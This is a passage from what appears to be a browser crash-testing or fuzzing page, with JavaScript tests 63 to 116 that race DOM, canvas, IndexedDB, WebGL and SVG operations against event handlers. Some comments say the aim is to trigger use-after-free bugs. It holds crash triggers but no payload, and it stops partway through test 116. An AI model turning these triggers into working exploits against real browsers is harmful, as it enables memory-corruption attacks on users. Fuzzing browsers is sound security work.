                const mql = window.matchMedia('(orientation: portrait)');
                mql.addListener(function() {
                    for (let i = sheet.cssRules.length - 1; i >= 0; i--) {
                        sheet.deleteRule(i);
                    }
                });
                
                window.dispatchEvent(new Event('resize'));
            } catch(e) {
                addLog('Test 63 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 64: importNode + insertBefore race
        function test64_ImportInsertRace() {
            addLog('TEST 64: importNode + insertBefore race');
            try {
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);
                
                iframe.onload = function() {
                    const iframeDoc = iframe.contentDocument;
                    const div = iframeDoc.createElement('div');
                    div.innerHTML = '<span>Test</span><b>Bold</b>';
                    
                    const imported = document.importNode(div, true);
                    const container = document.createElement('div');
                    testArea.appendChild(container);
                    
                    container.insertBefore(imported, null);
                    container.removeChild(imported);
                    container.insertBefore(imported, null);
                };
                
                iframe.src = 'about:blank';
            } catch(e) {
                addLog('Test 64 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 65: SVG + video + table combo
        function test65_SVGVideoTable() {
            addLog('TEST 65: SVG + Video + Table combination');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const video = document.createElement('video');
                const table = document.createElement('table');
                const tbody = table.createTBody();
                const row = tbody.insertRow();
                
                video.onloadedmetadata = function() {
                    tbody.deleteRow(0);
                    testArea.removeChild(svg);
                    const newRow = tbody.insertRow();
                };
                
                testArea.appendChild(svg);
                testArea.appendChild(video);
                testArea.appendChild(table);
            } catch(e) {
                addLog('Test 65 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 66: Form + Canvas + IndexedDB combo
        function test66_FormCanvasIndexedDB() {
            addLog('TEST 66: Form + Canvas + IndexedDB combo');
            try {
                const form = document.createElement('form');
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                form.onreset = function() {
                    const imageData = ctx.createImageData(50, 50);
                    const request = indexedDB.open('comboTest', 1);
                    request.onupgradeneeded = function(e) {
                        const db = e.target.result;
                        db.createObjectStore('store');
                    };
                    ctx.putImageData(imageData, 0, 0);
                };
                
                form.appendChild(canvas);
                testArea.appendChild(form);
                form.reset();
            } catch(e) {
                addLog('Test 66 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 67: Textarea + Range + Selection complex
        function test67_TextareaRangeComplex() {
            addLog('TEST 67: Textarea + Range + Selection complex');
            try {
                const textarea = document.createElement('textarea');
                textarea.value = 'Line 1\nLine 2\nLine 3\nLine 4';
                
                textarea.onselect = function() {
                    const range = document.createRange();
                    const selection = window.getSelection();
                    
                    selection.removeAllRanges();
                    range.selectNodeContents(textarea);
                    selection.addRange(range);
                    range.deleteContents();
                    
                    if (range.detach) {
                        range.detach();
                    }
                };
                
                testArea.appendChild(textarea);
                textarea.select();
            } catch(e) {
                addLog('Test 67 Exception: ' + e.message, true);
                crashes++;
            }
        }
// NEW TEST 68: deleteCell + onwebkitanimationiteration
        function test68_DeleteCellAnimation() {
            addLog('TEST 68: deleteCell during animation iteration');
            try {
                const style = document.createElement('style');
                style.textContent = '@-webkit-keyframes anim { from { opacity: 0; } to { opacity: 1; } } .anim { -webkit-animation: anim 0.1s infinite; }';
                document.head.appendChild(style);

                const table = document.createElement('table');
                const row = table.insertRow();
                row.insertCell().textContent = 'Cell 1';
                row.insertCell().textContent = 'Cell 2';
                row.className = 'anim';

                row.addEventListener('webkitAnimationIteration', function() {
                    if (row.cells.length > 0) {
                        row.deleteCell(0);
                        row.insertCell().textContent = 'New Cell';
                    }
                });

                testArea.appendChild(table);
            } catch(e) {
                addLog('Test 68 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 69: unsuspendRedraw + onresize
        function test69_UnsuspendRedrawResize() {
            addLog('TEST 69: SVG unsuspendRedraw + resize');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                testArea.appendChild(svg);
                let suspendID = null;

                if (svg.suspendRedraw) {
                    suspendID = svg.suspendRedraw(1000);
                }

                window.onresize = function() {
                    if (suspendID && svg.unsuspendRedraw) {
                        testArea.removeChild(svg);
                        svg.unsuspendRedraw(suspendID);
                    }
                };

                window.dispatchEvent(new Event('resize'));
            } catch(e) {
                addLog('Test 69 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 70: isPointInStroke + onseeked
        function test70_IsPointInStrokeSeek() {
            addLog('TEST 70: Canvas isPointInStroke + video seeked');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const video = document.createElement('video');

                ctx.rect(10, 10, 100, 100);
                
                video.onseeked = function() {
                    testArea.removeChild(canvas);
                    // Trigger potential UAF on path usage
                    ctx.isPointInStroke(50, 50);
                };

                testArea.appendChild(canvas);
                testArea.appendChild(video);
                video.currentTime = 0.1; // Trigger seek
            } catch(e) {
                addLog('Test 70 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 71: releaseEvents + onfocus
        function test71_ReleaseEventsFocus() {
            addLog('TEST 71: Legacy releaseEvents + focus');
            try {
                const btn = document.createElement('button');
                btn.textContent = 'Focus Me';
                
                btn.onfocus = function() {
                    if (window.releaseEvents) {
                        window.releaseEvents(Event.MOUSEDOWN);
                        testArea.removeChild(btn);
                        // Tenta acessar eventos aps release e remoo
                        btn.click(); 
                    }
                };

                testArea.appendChild(btn);
                btn.focus();
            } catch(e) {
                addLog('Test 71 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 72: outerHTML + ontoggle (Details element)
        function test72_OuterHTMLToggle() {
            addLog('TEST 72: outerHTML replacement during ontoggle');
            try {
                const details = document.createElement('details');
                const summary = document.createElement('summary');
                summary.textContent = 'Click me';
                details.appendChild(summary);
                details.open = false;

                details.ontoggle = function() {
                    details.outerHTML = '<div>Replaced</div>';
                };

                testArea.appendChild(details);
                details.open = true; // Trigger toggle
            } catch(e) {
                addLog('Test 72 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 73: remove + oncuechange
        function test73_RemoveCueChange() {
            addLog('TEST 73: Track element remove + oncuechange');
            try {
                const video = document.createElement('video');
                const track = document.createElement('track');
                track.kind = 'subtitles';
                track.src = 'data:text/vtt,WEBVTT\n\n00:00.000 --> 00:01.000\nTest';
                
                track.oncuechange = function() {
                    track.remove();
                    video.remove();
                };

                video.appendChild(track);
                testArea.appendChild(video);
                track.track.mode = 'showing';
            } catch(e) {
                addLog('Test 73 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 74: adoptNode + oncontextmenu
        function test74_AdoptNodeContext() {
            addLog('TEST 74: adoptNode during contextmenu');
            try {
                const iframe = document.createElement('iframe');
                const div = document.createElement('div');
                div.textContent = 'Right click here';
                testArea.appendChild(div);
                testArea.appendChild(iframe);

                div.oncontextmenu = function(e) {
                    e.preventDefault();
                    if (iframe.contentDocument) {
                        iframe.contentDocument.adoptNode(div);
                        div.innerHTML = 'Adopted';
                    }
                };

                div.dispatchEvent(new MouseEvent('contextmenu'));
            } catch(e) {
                addLog('Test 74 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 75: deleteMedium + onchange
        function test75_DeleteMediumChange() {
            addLog('TEST 75: CSS deleteMedium + input change');
            try {
                const style = document.createElement('style');
                style.textContent = '@media print { body { color: black; } }';
                document.head.appendChild(style);
                
                const input = document.createElement('input');
                
                input.onchange = function() {
                    if (style.sheet && style.sheet.media) {
                        try {
                            style.sheet.media.deleteMedium('print');
                            document.head.removeChild(style);
                            // Tenta acessar aps remover do DOM
                            style.sheet.media.appendMedium('screen');
                        } catch(err) {}
                    }
                };

                testArea.appendChild(input);
                input.value = 'changed';
                input.dispatchEvent(new Event('change'));
            } catch(e) {
                addLog('Test 75 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 76: deleteBuffer + oncontextlost (WebGL)
        function test76_WebGLContextLost() {
            addLog('TEST 76: WebGL deleteBuffer + context lost');
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                
                if (gl) {
                    const ext = gl.getExtension('WEBGL_lose_context');
                    const buffer = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);

                    canvas.addEventListener('webglcontextlost', function(e) {
                        e.preventDefault();
                        gl.deleteBuffer(buffer);
                        // Tentar usar buffer deletado num contexto perdido
                        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0,0]), gl.STATIC_DRAW);
                    });

                    if (ext) ext.loseContext();
                }
            } catch(e) {
                addLog('Test 76 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 77: insertRule + oninvalid
        function test77_InsertRuleInvalid() {
            addLog('TEST 77: CSS insertRule + form invalid');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                const input = document.createElement('input');
                input.required = true;

                input.oninvalid = function() {
                    if (style.sheet) {
                        style.sheet.insertRule('input { border: 5px solid red; }', 0);
                        document.head.removeChild(style);
                        // Modifica regra de folha detachada
                        style.sheet.cssRules[0].style.border = '1px solid blue';
                    }
                };

                testArea.appendChild(input);
                input.checkValidity(); // Triggers oninvalid
            } catch(e) {
                addLog('Test 77 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 78: createDocumentFragment + ondblclick
        function test78_CreateFragmentDblClick() {
            addLog('TEST 78: DocumentFragment + double click');
            try {
                const btn = document.createElement('button');
                btn.textContent = 'Double Click';
                
                btn.ondblclick = function() {
                    const fragment = document.createDocumentFragment();
                    fragment.appendChild(btn); // Move button to fragment
                    testArea.innerHTML = ''; // Clear test area (destroy parent)
                    fragment.removeChild(btn); // Remove from fragment
                };

                testArea.appendChild(btn);
                btn.dispatchEvent(new MouseEvent('dblclick'));
            } catch(e) {
                addLog('Test 78 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 79: textContent + oncopy
        function test79_TextContentCopy() {
            addLog('TEST 79: textContent setter during copy');
            try {
                const div = document.createElement('div');
                div.textContent = 'Select and copy me';
                testArea.appendChild(div);
                
                div.oncopy = function(e) {
                    div.textContent = ''; // Empty content during copy
                    div.remove();
                };

                div.dispatchEvent(new ClipboardEvent('copy'));
            } catch(e) {
                addLog('Test 79 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 80: deleteDatabase + onabort
        function test80_DeleteDatabaseAbort() {
            addLog('TEST 80: IndexedDB deleteDatabase on transaction abort');
            try {
                const request = indexedDB.open('abortDB', 1);
                request.onupgradeneeded = function(e) {
                    const db = e.target.result;
                    const trans = e.target.transaction;
                    
                    trans.onabort = function() {
                        indexedDB.deleteDatabase('abortDB');
                    };
                    
                    trans.abort();
                };
            } catch(e) {
                addLog('Test 80 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 81: createObjectStore + onversionchange
        function test81_ObjectStoreVersion() {
            addLog('TEST 81: createObjectStore inside onversionchange');
            try {
                const name = 'versionDB';
                const req1 = indexedDB.open(name, 1);
                
                req1.onsuccess = function(e) {
                    const db = e.target.result;
                    db.onversionchange = function() {
                        db.close();
                    };
                    
                    // Trigger version change
                    const req2 = indexedDB.open(name, 2);
                    req2.onupgradeneeded = function(ev) {
                        const db2 = ev.target.result;
                        db2.createObjectStore('newStore');
                        // Race condition: close vs create
                    };
                };
            } catch(e) {
                addLog('Test 81 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 82: importNode + onmouseenter
        function test82_ImportNodeEnter() {
            addLog('TEST 82: importNode during mouseenter');
            try {
                const iframe = document.createElement('iframe');
                const div = document.createElement('div');
                testArea.appendChild(iframe);
                testArea.appendChild(div);

                div.onmouseenter = function() {
                    if (iframe.contentDocument) {
                        const imported = document.importNode(div, true);
                        iframe.contentDocument.body.appendChild(imported);
                        testArea.removeChild(div);
                    }
                };

                div.dispatchEvent(new MouseEvent('mouseenter'));
            } catch(e) {
                addLog('Test 82 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 83: cloneNode + onmouseleave
        function test83_CloneNodeLeave() {
            addLog('TEST 83: cloneNode during mouseleave');
            try {
                const div = document.createElement('div');
                const span = document.createElement('span');
                div.appendChild(span);
                testArea.appendChild(div);

                div.onmouseleave = function() {
                    const clone = div.cloneNode(true); // Deep clone
                    testArea.replaceChild(clone, div);
                    // Access original children
                    span.textContent = 'Dead';
                };

                div.dispatchEvent(new MouseEvent('mouseleave'));
            } catch(e) {
                addLog('Test 83 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 84: deleteCaption + onpaste
        function test84_DeleteCaptionPaste() {
            addLog('TEST 84: Table deleteCaption during paste');
            try {
                const table = document.createElement('table');
                table.createCaption().textContent = 'Caption';
                table.contentEditable = true;
                testArea.appendChild(table);

                table.onpaste = function() {
                    table.deleteCaption();
                    table.remove();
                };

                table.focus();
                table.dispatchEvent(new ClipboardEvent('paste'));
            } catch(e) {
                addLog('Test 84 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 85: replaceChild + oncut
        function test85_ReplaceChildCut() {
            addLog('TEST 85: replaceChild during cut event');
            try {
                const div = document.createElement('div');
                div.contentEditable = true;
                div.innerHTML = '<b>Cut me</b>';
                testArea.appendChild(div);

                div.oncut = function() {
                    const img = document.createElement('img');
                    div.replaceChild(img, div.firstChild);
                    img.src = 'x'; // Trigger further events?
                };

                div.dispatchEvent(new ClipboardEvent('cut'));
            } catch(e) {
                addLog('Test 85 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 86: insertBefore + oninput
        function test86_InsertBeforeInput() {
            addLog('TEST 86: insertBefore during input event');
            try {
                const container = document.createElement('div');
                const input = document.createElement('input');
                const span = document.createElement('span');
                container.appendChild(input);
                testArea.appendChild(container);

                input.oninput = function() {
                    // Move input before span (which isn't attached yet)
                    // then attach span
                    container.insertBefore(input, null); 
                    container.appendChild(span);
                    container.insertBefore(span, input);
                };

                input.dispatchEvent(new Event('input'));
            } catch(e) {
                addLog('Test 86 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 87: removeChild + onselectionchange
        function test87_RemoveChildSelection() {
            addLog('TEST 87: removeChild during selectionchange');
            try {
                const div = document.createElement('div');
                div.textContent = 'Selection Target';
                testArea.appendChild(div);

                document.onselectionchange = function() {
                    if (div.parentNode) {
                        div.parentNode.removeChild(div);
                        // Selection is now pointing to detached node
                    }
                };

                const range = document.createRange();
                range.selectNodeContents(div);
                const sel = window.getSelection();
                sel.removeAllRanges();
                sel.addRange(range);
            } catch(e) {
                addLog('Test 87 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 88: cssText + onwheel
        function test88_CSSTextWheel() {
            addLog('TEST 88: cssText manipulation during wheel event');
            try {
                const div = document.createElement('div');
                testArea.appendChild(div);
                
                div.onwheel = function() {
                    div.style.cssText = 'color: red; transform: scale(2);';
                    div.style.removeProperty('transform');
                    testArea.innerHTML = ''; // Nuke DOM
                };

                div.dispatchEvent(new WheelEvent('wheel'));
            } catch(e) {
                addLog('Test 88 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 89: deleteRow + onwebkitfullscreenchange (Specific)
        function test89_DeleteRowFullscreen() {
            addLog('TEST 89: deleteRow + fullscreen change');
            try {
                const table = document.createElement('table');
                const row = table.insertRow();
                testArea.appendChild(table);

                document.onwebkitfullscreenchange = function() {
                    table.deleteRow(0);
                    // Tenta acessar row deletada
                    row.cells; 
                };

                // Simulando chamada (real requer interao de usurio)
                document.dispatchEvent(new Event('webkitfullscreenchange'));
            } catch(e) {
                addLog('Test 89 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 90: terminate (Nested Worker) + onmessage
        function test90_TerminateNestedWorker() {
            addLog('TEST 90: Nested worker termination race');
            try {
                const code = `
                    const worker = new Worker(URL.createObjectURL(new Blob(['postMessage("sub")'])));
                    worker.onmessage = () => postMessage("main");
                `;
                const blob = new Blob([code], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));

                worker.onmessage = function() {
                    worker.terminate();
                    worker.postMessage('dead?');
                };
            } catch(e) {
                addLog('Test 90 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 91: close (WebSocket) + onunload
        function test91_CloseWebSocketUnload() {
            addLog('TEST 91: WebSocket close during unload');
            try {
                const ws = new WebSocket('ws://localhost:9000');
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);

                iframe.contentWindow.onunload = function() {
                    ws.close();
                    ws.send('data');
                };

                // Trigger unload
                testArea.removeChild(iframe);
            } catch(e) {
                addLog('Test 91 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 92: detach (Range) + onselect
        function test92_DetachRangeSelection() {
            addLog('TEST 92: Range detach + input onselect');
            try {
                const input = document.createElement('input');
                input.value = 'Select text';
                testArea.appendChild(input);

                input.onselect = function() {
                    const range = document.createRange();
                    range.selectNode(input);
                    if (range.detach) {
                        range.detach();
                        // Use detached range
                        range.getBoundingClientRect();
                    }
                };

                input.select();
            } catch(e) {
                addLog('Test 92 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 93: removeRule + onwebkittransitionend
        function test93_RemoveRuleTransition() {
            addLog('TEST 93: removeRule during transition end');
            try {
                const style = document.createElement('style');
                style.textContent = '.trans { transition: all 0.1s; opacity: 1; }';
                document.head.appendChild(style);
                
                const div = document.createElement('div');
                div.className = 'trans';
                
                div.addEventListener('webkitTransitionEnd', function() {
                    if (style.sheet && style.sheet.cssRules.length > 0) {
                        style.sheet.deleteRule(0);
                        div.style.opacity = 0.5; // Trigger layout
                    }
                });

                testArea.appendChild(div);
                setTimeout(() => div.style.opacity = 0, 10);
            } catch(e) {
                addLog('Test 93 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 94: createImageData + onbeforeprint
        function test94_CreateImageDataPrint() {
            addLog('TEST 94: createImageData during print event');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');

                window.onbeforeprint = function() {
                    const img = ctx.createImageData(100, 100);
                    testArea.removeChild(canvas); // Detach canvas
                    ctx.putImageData(img, 0, 0); // Use ctx of detached canvas
                };

                window.dispatchEvent(new Event('beforeprint'));
            } catch(e) {
                addLog('Test 94 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 95: SVG getPointAtLength + onmousemove
        function test95_SVGPointStroke() {
            addLog('TEST 95: SVG getPointAtLength + mousemove');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
                path.setAttribute('d', 'M0 0 L100 100');
                svg.appendChild(path);
                testArea.appendChild(svg);

                path.onmousemove = function() {
                    const len = path.getTotalLength();
                    testArea.removeChild(svg);
                    path.getPointAtLength(len / 2);
                };

                path.dispatchEvent(new MouseEvent('mousemove'));
            } catch(e) {
                addLog('Test 95 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 96: createPattern + onblur (Canvas)
        function test96_CanvasPatternBlur() {
            addLog('TEST 96: createPattern + blur');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const img = document.createElement('img'); // Empty img
                
                canvas.tabIndex = 1;
                canvas.onblur = function() {
                    try {
                        const pattern = ctx.createPattern(img, 'repeat');
                        ctx.fillStyle = pattern;
                    } catch(err) {}
                    testArea.innerHTML = '';
                };

                testArea.appendChild(canvas);
                canvas.focus();
                canvas.blur();
            } catch(e) {
                addLog('Test 96 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 97: Recursive createObjectStore
        function test97_RecursiveObjectStore() {
            addLog('TEST 97: Recursive object store creation');
            try {
                const req = indexedDB.open('recursive2', 1);
                req.onupgradeneeded = function(e) {
                    const db = e.target.result;
                    let i = 0;
                    try {
                        function recursive() {
                            if (i++ < 20) {
                                db.createObjectStore('s' + i);
                                recursive();
                            }
                        }
                        recursive();
                    } catch(err) {}
                };
            } catch(e) {
                addLog('Test 97 Exception: ' + e.message, true);
                crashes++;
            }
        }
// NEW TEST 98: TreeWalker + removeChild
        function test98_TreeWalkerRemove() {
            addLog('TEST 98: TreeWalker traversal with node removal');
            try {
                const root = document.createElement('div');
                root.innerHTML = '<span>A</span><b>B</b><i>C</i>';
                testArea.appendChild(root);
                
                const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null, false);
                
                let node = walker.nextNode();
                while(node) {
                    const next = walker.nextNode();
                    if (node.parentNode) {
                        node.parentNode.removeChild(node); // Remove current node while walking
                    }
                    node = next;
                }
            } catch(e) {
                addLog('Test 98 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 99: NodeIterator + replaceChild
        function test99_NodeIteratorReplace() {
            addLog('TEST 99: NodeIterator + replaceChild');
            try {
                const root = document.createElement('div');
                for(let i=0; i<10; i++) root.appendChild(document.createElement('span'));
                testArea.appendChild(root);

                const iter = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
                let node;
                while(node = iter.nextNode()) {
                    const comment = document.createComment('replaced');
                    if (node.parentNode) {
                        node.parentNode.replaceChild(comment, node); // Invalidate iterator reference
                    }
                }
            } catch(e) {
                addLog('Test 99 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 100: MutationObserver Infinite Loop
        function test100_MutationObserverLoop() {
            addLog('TEST 100: MutationObserver recursive modification');
            try {
                const target = document.createElement('div');
                testArea.appendChild(target);
                
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        // Trigger another mutation immediately
                        target.setAttribute('data-test', Math.random());
                        target.appendChild(document.createElement('span'));
                    });
                });
                
                observer.observe(target, { attributes: true, childList: true });
                target.setAttribute('data-start', 'true');
                
                // Stop after 2 seconds to avoid freezing completely if it doesn't crash
                setTimeout(() => observer.disconnect(), 2000);
            } catch(e) {
                addLog('Test 100 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 101: Range surroundContents + extractContents
        function test101_RangeSurroundExtract() {
            addLog('TEST 101: Range manipulation on same nodes');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<p>Start</p><b>Middle</b><p>End</p>';
                testArea.appendChild(div);
                
                const range = document.createRange();
                range.selectNode(div.querySelector('b'));
                
                const wrapper = document.createElement('div');
                range.surroundContents(wrapper);
                
                // Immediately try to extract from modified DOM
                range.extractContents(); 
            } catch(e) {
                addLog('Test 101 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 102: Selection.modify + DOM Removal
        function test102_SelectionModifyCrash() {
            addLog('TEST 102: Selection.modify + Node removal');
            try {
                const div = document.createElement('div');
                div.contentEditable = true;
                div.textContent = 'Some text to select';
                testArea.appendChild(div);
                div.focus();
                
                const sel = window.getSelection();
                sel.selectAllChildren(div);
                
                // Modify selection while removing parent
                sel.modify('extend', 'forward', 'word');
                testArea.removeChild(div);
                sel.modify('extend', 'forward', 'word'); // Operate on detached node
            } catch(e) {
                addLog('Test 102 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 103: DOMParser + Abort
        function test103_DOMParserAbort() {
            addLog('TEST 103: Heavy DOM Parsing');
            try {
                const parser = new DOMParser();
                const heavyXML = '<root>' + '<item>Test</item>'.repeat(5000) + '</root>';
                
                // Try to interrupt parsing
                const doc = parser.parseFromString(heavyXML, 'text/xml');
                doc.documentElement.innerHTML = ''; 
            } catch(e) {
                addLog('Test 103 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 104: Canvas toBlob (Async) + Context Loss
        function test104_CanvasBlobRace() {
            addLog('TEST 104: Canvas toBlob + Context destruction');
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 1024;
                canvas.height = 1024; // Large canvas
                const ctx = canvas.getContext('2d');
                ctx.fillRect(0,0,1024,1024);
                
                canvas.toBlob(function(blob) {
                    // This callback runs async. 
                    // By now we will have destroyed the canvas.
                    const newCtx = canvas.getContext('2d');
                    newCtx.fillRect(0,0,10,10);
                });
                
                // Destroy immediately
                canvas.width = 0;
                canvas.height = 0;
                testArea.removeChild(canvas);
            } catch(e) {
                addLog('Test 104 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 105: XHR Synchronous + onpagehide
        function test105_XHRSyncPageHide() {
            addLog('TEST 105: Sync XHR during pagehide');
            try {
                window.onpagehide = function() {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', location.href, false); // Sync request
                    xhr.send(null);
                };
                
                // Simulate event
                window.dispatchEvent(new Event('pagehide'));
            } catch(e) {
                addLog('Test 105 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 106: FontFace loading + document.fonts.clear
        function test106_FontFaceClear() {
            addLog('TEST 106: FontFace load race');
            try {
                const font = new FontFace('TestFont', 'url(about:blank)');
                document.fonts.add(font);
                
                font.load().then(function() {
                    // Do nothing
                }).catch(function() {
                    // Expected error
                });
                
                document.fonts.clear(); // Clear while loading
            } catch(e) {
                addLog('Test 106 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 107: Navigator Locks (if available)
        function test107_NavigatorLocksRace() {
            addLog('TEST 107: Navigator Locks Request');
            try {
                if (navigator.locks) {
                    navigator.locks.request('resource', async (lock) => {
                        // Hold lock
                        await new Promise(r => setTimeout(r, 100));
                    });
                    // Request same lock immediately to stress queue
                    navigator.locks.request('resource', (lock) => {});
                } else {
                    addLog('Navigator Locks not supported');
                }
            } catch(e) {
                addLog('Test 107 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 108: matchMedium / StyleMedia
        function test108_StyleMediaMatch() {
            addLog('TEST 108: StyleMedia matchMedium loop');
            try {
                if (window.styleMedia) {
                    for(let i=0; i<100; i++) {
                        window.styleMedia.matchMedium('screen and (min-width: '+i+'px)');
                    }
                }
            } catch(e) {
                addLog('Test 108 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 109: Create NodeIterator with Filter + Detach
        function test109_CreateNodeIteratorFilter() {
            addLog('TEST 109: NodeIterator filter detach');
            try {
                const root = document.createElement('div');
                testArea.appendChild(root);
                
                const filter = {
                    acceptNode: function(node) {
                        testArea.innerHTML = ''; // Detach everything during filter
                        return NodeFilter.FILTER_ACCEPT;
                    }
                };
                
                const iter = document.createNodeIterator(root, NodeFilter.SHOW_ALL, filter);
                root.appendChild(document.createElement('span'));
                iter.nextNode();
            } catch(e) {
                addLog('Test 109 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 110: TextTrack removeCue
        function test110_TextTrackCueRemove() {
            addLog('TEST 110: TextTrack removeCue manipulation');
            try {
                const video = document.createElement('video');
                const track = video.addTextTrack('subtitles');
                const cue = new VTTCue(0, 1, 'Test');
                track.addCue(cue);
                
                track.oncuechange = function() {
                    track.removeCue(cue);
                    track.addCue(cue); // Add back immediately
                };
                
                video.currentTime = 0.5; // Trigger
            } catch(e) {
                addLog('Test 110 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 111: CSS Animation PlayState
        function test111_AnimationPlayState() {
            addLog('TEST 111: Toggling animation-play-state rapidly');
            try {
                const div = document.createElement('div');
                div.style.cssText = 'animation: spin 1s infinite;';
                testArea.appendChild(div);
                
                let count = 0;
                const interval = setInterval(() => {
                    div.style.animationPlayState = (count++ % 2 === 0) ? 'paused' : 'running';
                    if (count > 20) {
                        clearInterval(interval);
                        testArea.removeChild(div);
                    }
                }, 10);
            } catch(e) {
                addLog('Test 111 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 112: Crypto getRandomValues Large Buffer
        function test112_CryptoLargeBuffer() {
            addLog('TEST 112: Crypto large buffer allocation');
            try {
                if (window.crypto) {
                    const arr = new Uint8Array(65536);
                    for(let i=0; i<100; i++) {
                        window.crypto.getRandomValues(arr);
                    }
                }
            } catch(e) {
                addLog('Test 112 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 113: History API Flood
        function test113_HistoryPushStateFlood() {
            addLog('TEST 113: History pushState flood');
            try {
                for(let i=0; i<50; i++) {
                    history.pushState({id: i}, 'Title ' + i, '#state'+i);
                }
            } catch(e) {
                addLog('Test 113 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 114: Form requestSubmit + DOM Removal
        function test114_FormRequestSubmit() {
            addLog('TEST 114: Form requestSubmit + remove');
            try {
                const form = document.createElement('form');
                form.onsubmit = function(e) {
                    e.preventDefault();
                    testArea.removeChild(form); // Detach form during submit
                };
                testArea.appendChild(form);
                if (form.requestSubmit) {
                    form.requestSubmit();
                } else {
                    form.dispatchEvent(new Event('submit'));
                }
            } catch(e) {
                addLog('Test 114 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 115: SVG <use> Shadow Tree
        function test115_SVGUseShadowTree() {
            addLog('TEST 115: SVG use element recursive');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
                const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
                g.id = 'group';
                defs.appendChild(g);
                svg.appendChild(defs);
                
                const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
                use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#group');
                
                g.appendChild(use); // Recursive reference
                testArea.appendChild(svg);
            } catch(e) {
                addLog('Test 115 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // NEW TEST 116: Canvas Clip Stack Exhaustion
        function test116_CanvasClipStack() {
            addLog('TEST 116: Canvas clip() recursion');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                for(let i=0; i<1000; i++) {
                    ctx.save();
                    ctx.rect(0,0,10,10);
